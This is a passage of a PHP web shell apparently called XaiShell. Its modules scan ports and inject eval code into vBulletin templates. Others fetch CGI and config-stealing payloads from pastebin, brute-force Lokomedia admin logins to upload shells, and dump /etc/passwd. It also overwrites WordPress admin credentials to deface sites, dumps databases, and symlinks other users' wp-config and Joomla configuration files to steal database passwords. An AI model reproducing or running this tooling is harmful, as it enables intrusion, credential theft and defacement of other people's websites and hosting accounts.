   echo ' $ip : $o_port ??? <u style="color: white">Open</u> <br /><br />';
   flush();
   }
   }
   }
   function findit($mytext,$starttag,$endtag) {
   $posLeft = @stripos($mytext,$starttag)+strlen($starttag);
   $posRight = @stripos($mytext,$endtag,$posLeft+1);
   return @substr($mytext,$posLeft,$posRight-$posLeft);
   flush();
   }
   echo '<br><br><center>';
   echo '
    <br />
    <div class="sc"><form method="post"><table>
	<tr><th colspan="5" style="border: 2px lime dotted;">Whois Site</th></tr>
    <tr><td>Site to scan </td><td>:</td><td><input type="text" name="site" size="50" style="color:white;" class="inputz" value="site.com" /> &nbsp <input class="inputzbut" type="submit" style="color:white;background-color:#000000" name="scan" value="Scan !" /></td></tr>
    </table></form></div>';
   if(isset($_POST['scan']))
   {
   $site = @htmlentities($_POST['site']);
   if (empty($site)){die('<br /><br /> Not add IP .. !');}
   $ip_port = @gethostbyname($site);
   echo "
   <br /><div class='sc2'>Scanning [ $site ip $ip_port ] ... </div>
   <div class='tit'> <br /><br />|-------------- Port Server ------------------| <br /></div>
   <div class='ru'> <br /><br /><pre>
   ";
   echo "".sws_port_scan($ip_port)." </pre></div> ";
   flush();
   echo '<div class="tit"><br /><br />|-------------- Domain Info ------------------| <br /> </div>
   <div class="ru">
   <pre>".sws_domain_info($site)."</pre></div>';
   flush();
   echo '
   <div class="tit"> <br /><br />|-------------- Network Info ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_net_info($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- subdomains Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_sup_dom($site)."</pre> </div>';
   flush();
   echo '<div class="tit"> <br /><br />|-------------- Site Server ------------------| <br /></div>
   <div class="ru">
   <pre>".sws_site_ser($site)."</pre> </div>
   <div class="tit"> <br /><br />|-------------- END ------------------| <br /></div>';
   flush();
   }
   echo '</center>';
} elseif($_GET['do'] == 'vb') {
   {
   ?>
   <form action method="post">
   <br><br><br><div align="center">
   <H2><span style="font-weight: 400"><font face="Trebuchet MS" size="4">
   <b><font color="white">VB IndeX Changer</font></b>
   </div><br>
   <?php
   if(empty($_POST['index'])){
   echo "<center><FORM method=POST>";
   echo "<table class=tabnet>
<th colspan=2>Vb Index Changer</th>
<tr><td>host </td><td><input class=inputz type=text size=60 name=localhost value=localhost></td></tr>
<tr><td>database </td><td><input class=inputz type=text size=60 name=database value=forum_vb></td></tr>
<tr><td>username </td><td><input class=inputz type=text size=60 name=username value=user_vb></td></tr>
<tr><td>password </td><td><input class=inputz type=text size=60 name=password value=vb></td></tr>
</tr>
<th colspan=2>Your Index Code</th></table><table class=tabnet>
<TEXTAREA name=index rows=13 style='width: 450px; height: 200px;' border=1 cols=69 name=code>Your Index Code Here...</TEXTAREA><br>
<INPUT class=inputzbut type=submit value=setting name=send>
</FORM></table></center>";
    }else{
    $localhost = $_POST['localhost'];
    $database = $_POST['database'];
    $username = $_POST['username'];
    $password = $_POST['password'];
    $index = $_POST['index'];
    @mysql_connect($localhost,$username,$password) or die(mysql_error());
    @mysql_select_db($database) or die(mysql_error());
    $index=str_replace("'","'",$index);
    $set_index = "{${eval(base64_decode('";
    $set_index .= base64_encode("echo "$index";");
    $set_index .= "'))}}{${exit()}}</textarea>";
    echo("SET template ='".$set_index."' ") ;
    $ok=@mysql_query("SET template ='".$set_index."'") or die(mysql_error());
    if($ok){
    echo "Update success...<br><br>";
    } 
  }
}

} elseif($_GET['do'] == 'symlink')
{	
@set_time_limit(0);

echo "<br><br><center><h1>Symlink by XaiShell</h1></center><br><br><center><div class=content>";

@mkdir('sym',0777);
$htaccess  = "Options all n DirectoryIndex Sux.html n AddType text/plain .php n AddHandler server-parsed .php n  AddType text/plain .html n AddHandler txt .html n Require None n Satisfy Any";
$write =@fopen ('sym/.htaccess','w');
fwrite($write ,$htaccess);
@symlink('/','sym/root');
$filelocation = basename(__FILE__);
$read_named_conf = @file('/etc/named.conf');
if(!$read_named_conf)
{
echo "<pre class=ml1 style='margin-top:5px'># Cant access this file on server -> [ /etc/named.conf ]</pre></center>"; 
}
else
{
echo "<br><br><div class='tmp'><table border='1' bordercolor='white' width='500' cellpadding='1' cellspacing='0'><td>Domains</td><td>Users</td><td>symlink </td>";
foreach($read_named_conf as $subject){
if(eregi('zone',$subject)){
preg_match_all('#zone "(.*)"#',$subject,$string);
flush();
if(strlen(trim($string[1][0])) >2){
$UID = posix_getpwuid(@fileowner('/etc/valiases/'.$string[1][0]));
$name = $UID['name'] ;
@symlink('/','sym/root');
$name   = $string[1][0];
$iran   = '.ir';
$israel = '.il';
$indo   = '.id';
$sg12   = '.sg';
$edu    = '.edu';
$gov    = '.gov';
$gose   = '.go';
$gober  = '.gob';
$mil1   = '.mil';
$mil2   = '.mi';
$malay	= '.my';
$china	= '.cn';
$japan	= '.jp';
$austr	= '.au';
$porn	= '.xxx';
$as		= '.uk';
$calfn	= '.ca';

if (eregi("$iran",$string[1][0]) or eregi("$israel",$string[1][0]) or eregi("$indo",$string[1][0])or eregi("$sg12",$string[1][0]) or eregi ("$edu",$string[1][0]) or eregi ("$gov",$string[1][0])
or eregi ("$gose",$string[1][0]) or eregi("$gober",$string[1][0]) or eregi("$mil1",$string[1][0]) or eregi ("$mil2",$string[1][0])
or eregi ("$malay",$string[1][0]) or eregi("$china",$string[1][0]) or eregi("$japan",$string[1][0]) or eregi ("$austr",$string[1][0])
or eregi("$porn",$string[1][0]) or eregi("$as",$string[1][0]) or eregi ("$calfn",$string[1][0]))
{
$name = "<div style=' color: #FF0000 ; text-shadow: 0px 0px 1px red; '>".$string[1][0].'</div>';
}
echo "
<tr>

<td>
<div class='dom'><a target='_blank' href=http://www.".$string[1][0].'/>'.$name.' </a> </div>
</td>

<td>
'.$UID['name']."
</td>

<td>
<a href='sym/root/home/".$UID['name']."/public_html' target='_blank'>Symlink </a>
</td>

</tr></div> ";
flush();
}
}
}
}

echo "</center></table>";   


} elseif($_GET['do'] == 'cgi') {
	$cgi_dir = mkdir('idx_cgi', 0755);
	$file_cgi = "idx_cgi/cgi.izo";
	$isi_htcgi = "AddHandler cgi-script .izo";
	$htcgi = fopen(".htaccess", "w");
	$cgi_script = file_get_contents("http://pastebin.com/raw.php?i=XTUFfJLg");
	$cgi = fopen($file_cgi, "w");
	fwrite($cgi, $cgi_script);
	fwrite($htcgi, $isi_htcgi);
	chmod($file_cgi, 0755);
	echo "<iframe src='idx_cgi/cgi.izo' width='100%' height='100%' frameborder='0' scrolling='no'></iframe>";
} elseif($_GET['do'] == 'lokomedia') {
	function cek($url) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
function curl($url,$payload) {
	$ch = curl_init($url);
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		  curl_setopt($ch, CURLOPT_POST, true);
		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		  curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		  curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
	$res = curl_exec($ch);
		  curl_close($ch);
	return $res;
}
	echo "<center>
	<h1>&#x4c;&#x6f;&#x6b;&#x6f;&#x6d;&#x65;&#x64;&#x69;&#x61;&#x20;&#x41;&#x75;&#x74;&#x6f;&#x20;&#x54;&#x61;&#x6e;&#x61;&#x6d;&#x20;&#x53;&#x68;&#x65;&#x6c;&#x6c;</h1>
	<form method='post'>
	Domain: <br>
	<textarea placeholder='&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x74;&#x61;&#x72;&#x67;&#x65;&#x74;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;' name='url' style='width: 500px; height: 250px;'></textarea><br>
	<input type='submit' name='hajar' value='&#x5909;&#x4f53;'>
	</form>";
if($_POST['hajar']) {
	$domain = explode("\r\n", $_POST['url']);
	$up = array(
		"admin" => "admin",
		"admin" => "123456",
		"xai" => "xaixploit",
		"admin" => "admin12345",
		"admin" => "admin123",
		"direktur" => "admin",
		);
	foreach($domain as $url) {
		foreach($up as $user => $pass) {
			$data1 = array(
				"username" => $user,
				"password" => $pass,
				);
			$login = curl($url."/adminweb/cek_login.php", $data1);
			if(preg_match("/Logout|Administrator/", $login)) {
				$file = "shellmu.php"; //1 dir dengan exploiternyaa
				$data2 = array(
					"judul" => "xaishell auto exploiter lokomedia",
					"fupload" => "@$file",
					"upload" => " &nbsp;&nbsp;&nbsp;&nbsp; Simpan &nbsp;&nbsp;&nbsp;&nbsp;",
					);
				$ngirim = curl($url."/adminweb/modul/mod_download/aksi_download.php?module=download&act=input",$data);
				if(preg_match("/xaixploit auto exploiter lokomedia/i", $ngirim)) {
					echo "[+] $url -> <font color=green>sukses login [ user: $user pass: $pass ]</font><br>";
					$cek = cek("$url/files/image.php");
					if(preg_match("/xaixploit/", $cek)) {
						echo "[+] $url/files/image.php -> <font color=green>shelmu.</font><br><br>";
					} else {
						echo "[-] <font color='#bb0000'>shellmu gaada.</font><br><br>";
					}
				}
			} else {
				echo "[-] $url -> gagal login<br><br>";
			}
		}
	}
}

} elseif($_GET['do'] == 'fake_root') {
	ob_start();
	function reverse($url) {
		$ch = curl_init("http://domains.yougetsignal.com/domains.php");
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
			  curl_setopt($ch, CURLOPT_HEADER, 0);
			  curl_setopt($ch, CURLOPT_POST, 1);
		$resp = curl_exec($ch);
		$resp = str_replace("[","", str_replace("]","", str_replace("\"\"","", str_replace(", ,",",", str_replace("{","", str_replace("{","", str_replace("}","", str_replace(", ",",", str_replace(", ",",",  str_replace("'","", str_replace("'","", str_replace(":",",", str_replace('"','', $resp ) ) ) ) ) ) ) ) ) ))));
		$array = explode(",,", $resp);
		unset($array[0]);
		foreach($array as $lnk) {
			$lnk = "http://$lnk";
			$lnk = str_replace(",", "", $lnk);
			echo $lnk."\n";
			ob_flush();
			flush();
		}
			  curl_close($ch);
	}
	function cek($url) {
		$ch = curl_init($url);
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1 );
			  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		$resp = curl_exec($ch);
		return $resp;
	}
	$cwd = getcwd();
	$ambil_user = explode("/", $cwd);
	$user = $ambil_user[2];
	if($_POST['reverse']) {
		$site = explode("\r\n", $_POST['url']);
		$file = $_POST['file'];
		foreach($site as $url) {
			$cek = cek("$url/~$user/$file");
			if(preg_match("/hacked/i", $cek)) {
				echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
			}
		}
	} else {
		echo "<center><form method='post'>
		Filename: <br><input type='text' name='file' value='deface.html' size='50' height='10'><br>
		User: <br><input type='text' value='$user' size='50' height='10' readonly><br>
		Domain: <br>
		<textarea style='width: 450px; height: 250px;' name='url'>";
		reverse($_SERVER['HTTP_HOST']);
		echo "</textarea><br>
		<input type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center>";
	}
   
    } elseif($_GET['do'] == 'configfuck') {
    $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
    function configfuck($url, $isi) {
        $fp = fopen($isi, "w");
        $ch = curl_init();
              curl_setopt($ch, CURLOPT_URL, $url);
              curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
              curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
              curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
              curl_setopt($ch, CURLOPT_FILE, $fp);
        return curl_exec($ch);
              curl_close($ch);
        fclose($fp);
        ob_flush();
        flush();
    }
    if(file_exists('configfuck.php')) {
        echo "<center><font color=lime><a href='$full/configfuck.php' target='_blank'>-> configfucker <-</a></font></center>";
    } else {
        if(configfuck("http://pastebin.com/raw/HbUY2UZD","configfuck.php")) {
            echo "<center><font color=lime><a href='$full/configfuck.php' target='_blank'>-> configfucker <-</a></font></center>";
        } else {
            echo "<center><font color=red>gagal buat file configfucker</font></center>";
        }
    }
   
} elseif($_GET['do'] == 'adminer') {
	$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
	function adminer($url, $isi) {
		$fp = fopen($isi, "w");
		$ch = curl_init();
		 	  curl_setopt($ch, CURLOPT_URL, $url);
		 	  curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		 	  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		   	  curl_setopt($ch, CURLOPT_FILE, $fp);
		return curl_exec($ch);
		   	  curl_close($ch);
		fclose($fp);
		ob_flush();
		flush();
	}
	if(file_exists('adminer.php')) {
		echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
	} else {
		if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
			echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
		} else {
			echo "<center><font color=red>gagal buat file adminer</font></center>";
		}
	}
}elseif($_GET['do'] == 'passwbypass') {
	echo '<center>Bypass etc/passw With:<br>
<table style="width:50%">
  <tr>
    <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
    <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td>	
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>		
    <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
</tr></table>Bypass User With : <table style="width:50%">
<tr>
    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>	
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>		
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
} elseif($_GET['do'] == 'auto_dwp') {
	if($_POST['auto_deface_wp']) {
		function anucurl($sites) {
    		$ch = curl_init($sites);
	       		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	       		  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	       		  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
	       		  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	       		  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	       		  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
	       		  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		function lohgin($cek, $web, $userr, $pass, $wp_submit) {
    		$post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
			$ch = curl_init($cek);
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
				  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				  curl_setopt($ch, CURLOPT_POST, 1);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
				  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
				  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
			$data = curl_exec($ch);
				  curl_close($ch);
			return $data;
		}
		$scan = $_POST['link_config'];
		$link_config = scandir($scan);
		$script = htmlspecialchars($_POST['script']);
		$user = "rintoar";
		$pass = "xaixploit";
		$passx = md5($pass);
		foreach($link_config as $dir_config) {
			if(!is_file("$scan/$dir_config")) continue;
			$config = file_get_contents("$scan/$dir_config");
			if(preg_match("/WordPress/", $config)) {
				$dbhost = ambilkata($config,"DB_HOST', '","'");
				$dbuser = ambilkata($config,"DB_USER', '","'");
				$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
				$dbname = ambilkata($config,"DB_NAME', '","'");
				$dbprefix = ambilkata($config,"table_prefix  = '","'");
				$prefix = $dbprefix."users";
				$option = $dbprefix."options";
				$conn = mysql_connect($dbhost,$dbuser,$dbpass);
				$db = mysql_select_db($dbname);
				$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
				$result = mysql_fetch_array($q);
				$id = $result[ID];
				$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
				$result2 = mysql_fetch_array($q2);
				$target = $result2[option_value];
				if($target == '') {					
					echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
				} else {
					echo "[+] $target <br>";
				}
				$update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
				if(!$conn OR !$db OR !$update) {
					echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
					mysql_close($conn);
				} else {
					$site = "$target/wp-login.php";
					$site2 = "$target/wp-admin/theme-install.php?upload";
					$b1 = anucurl($site2);
					$wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
					$b = lohgin($site, $site2, $user, $pass, $wp_sub);
					$anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
					$upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
					$www = "m.php";
					$fp5 = fopen($www,"w");
					fputs($fp5,$upload3);
					$post2 = array(
							"_wpnonce" => "$anu2",
							"_wp_http_referer" => "/wp-admin/theme-install.php?upload",
							"themezip" => "@$www",
							"install-theme-submit" => "Install Now",
							);
					$ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
						  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
						  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
						  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
						  curl_setopt($ch, CURLOPT_POST, 1);
						  curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
						  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
						  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
					      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
					$data3 = curl_exec($ch);
						  curl_close($ch);
					$y = date("Y");
					$m = date("m");
					$namafile = "id.php";
					$fpi = fopen($namafile,"w");
					fputs($fpi,$script);
					$ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
						   curl_setopt($ch6, CURLOPT_POST, true);
						   curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
						   curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
						   curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
	       		  		   curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
	       		  		   curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
					$postResult = curl_exec($ch6);
						   curl_close($ch6);
					$as = "$target/k.php";
					$bs = anucurl($as);
					if(preg_match("#$script#is", $bs)) {
            	       	echo "[+] <font color='lime'>berhasil mepes...</font><br>";
            	       	echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
            	        } else {
            	        echo "[-] <font color='red'>gagal mepes...</font><br>";
            	        echo "[!!] coba aja manual: <br>";
            	        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
            	        echo "[+] username: <font color=lime>$user</font><br>";
            	        echo "[+] password: <font color=lime>$pass</font><br><br>";     
            	        }
            		mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center><h1>WordPress Auto Deface</h1>
		<form method='post'>
		<input type='text' name='link_config' size='50' height='10' value='$dir'><br>
		<input type='text' name='script' height='10' size='50' placeholder='Hacked By Rinto AR' required><br>
		<input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
		</form>
		<br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
		</center>";
	}
} elseif($_GET['do'] == 'dbdump')
    {
echo $head.'<p align="center">';
echo '
<form action method=post>
<table width=371 class=tabnet >
<tr><th colspan="2">Database Dump</th></tr>
<tr>
	<td>Server </td>
	<td><input class="inputz" type=text name=server size=52></td></tr><tr>
	<td>Username</td>
	<td><input class="inputz" type=text name=username size=52></td></tr><tr>
	<td>Password</td>
	<td><input class="inputz" type=text name=password size=52></td></tr><tr>
	<td>DataBase Name</td>
	<td><input class="inputz" type=text name=dbname size=52></td></tr>
	<tr>
	<td>DB Type </td>
	<td><form method=post action="'.$me.'">
	<select class="inputz" name=method>
		<option  value="gzip">Gzip</option>
		<option value="sql">Sql</option>
		</select>
	<input class="inputzbut" type=submit value="  Dump!  " ></td></tr>
	</form></center></table>';
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='ssql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";nn");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");n");
        }
    }
}
if ($method=='ssql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);   
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
} 
fclose($fp); 
}


} elseif($_GET['do'] == 'grabber') {
echo "
<head>
<link rel='icon' type='image/ico' href='http://www.haurgeulis-security.com/favicon.ico/>
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #1975FF ;
border:1px solid white ;
border-left: 4px solid white ;
}
input {
color: #1975FF;
border:1px dotted white;
}
</style>";
echo "<br><center><span style='font-size:30px;'>Config Grabber by Rinto AR</span>";?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Tahoma" color="#007700" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='area' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='inputzbut' size="100" value="Grabber Now!" type="submit"><br></form></center><br><?php }if ($_POST['config']) {$function = $functions=@ini_get("disable_functions");if(eregi("symlink",$functions)){die ('<error>Symlink is disabled :( </error>');}@mkdir('xaishell_grab', 0755);@chdir('xaishell_grab');
$htaccess="
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php 
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All";
file_put_contents(".htaccess",$htaccess,FILE_APPEND);$passwd=$_POST["passwd"];$passwd=explode("n",$passwd);echo "<br><br><center><font color=#b0b000 size=2pt>wait ...</center><br>";foreach($passwd as $pwd){$pawd=explode(":",$pwd);$user =$pawd[0];@symlink('/home/'.$user.'/public_html/application/config/database.php',$user.'-config2.txt');@symlink('/home/'.$user.'/public_html/application/database/config.php',$user.'-config3.txt');@symlink('/home/'.$user.'/public_html/system/config/database.php',$user.'-config4.txt');@symlink('/home/'.$user.'/public_html/system/config.php',$user.'-config5.txt');@symlink('/home/'.$user.'/public_html/includes/config.php',$user.'-config6.txt');@symlink('/home/'.$user.'/public_html/wp-config.php',$user.'-wp13.txt');@symlink('/home/'.$user.'/public_html/wp/wp-config.php',$user.'-wp13-wp.txt');@symlink('/home/'.$user.'/public_html/WP/wp-config.php',$user.'-wp13-WP.txt');@symlink('/home/'.$user.'/public_html/wp/beta/wp-config.php',$user.'-wp13-wp-beta.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp13-beta.txt');@symlink('/home/'.$user.'/public_html/press/wp-config.php',$user.'-wp13-press.txt');@symlink('/home/'.$user.'/public_html/wordpress/wp-config.php',$user.'-wp13-wordpress.txt');@symlink('/home/'.$user.'/public_html/Wordpress/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp13-Wordpress.txt');@symlink('/home/'.$user.'/public_html/config.php',$user.'-configgg.txt');@symlink('/home/'.$user.'/public_html/news/wp-config.php',$user.'-wp13-news.txt');@symlink('/home/'.$user.'/public_html/new/wp-config.php',$user.'-wp13-new.txt');@symlink('/home/'.$user.'/public_html/blog/wp-config.php',$user.'-wp-blog.txt');@symlink('/home/'.$user.'/public_html/beta/wp-config.php',$user.'-wp-beta.txt');@symlink('/home/'.$user.'/public_html/blogs/wp-config.php',$user.'-wp-blogs.txt');@symlink('/home/'.$user.'/public_html/home/wp-config.php',$user.'-wp-home.txt');@symlink('/home/'.$user.'/public_html/db.php',$user.'-dbconf.txt');@symlink('/home/'.$user.'/public_html/site/wp-config.php',$user.'-wp-site.txt');@symlink('/home/'.$user.'/public_html/main/wp-config.php',$user.'-wp-main.txt');@symlink('/home/'.$user.'/public_html/configuration.php',$user.'-wp-test.txt');@symlink('/home/'.$user.'/public_html/joomla/configuration.php',$user.'-joomla2.txt');@symlink('/home/'.$user.'/public_html/portal/configuration.php',$user.'-joomla-protal.txt');@symlink('/home/'.$user.'/public_html/joo/configuration.php',$user.'-joo.txt');@symlink('/home/'.$user.'/public_html/cms/configuration.php',$user.'-joomla-cms.txt');@symlink('/home/'.$user.'/public_html/site/configuration.php',$user.'-joomla-site.txt');@symlink('/home/'.$user.'/public_html/main/configuration.php',$user.'-joomla-main.txt');@symlink('/home/'.$user.'/public_html/news/configuration.php',$user.'-joomla-news.txt');@symlink('/home/'.$user.'/public_html/new/configuration.php',$user.'-joomla-new.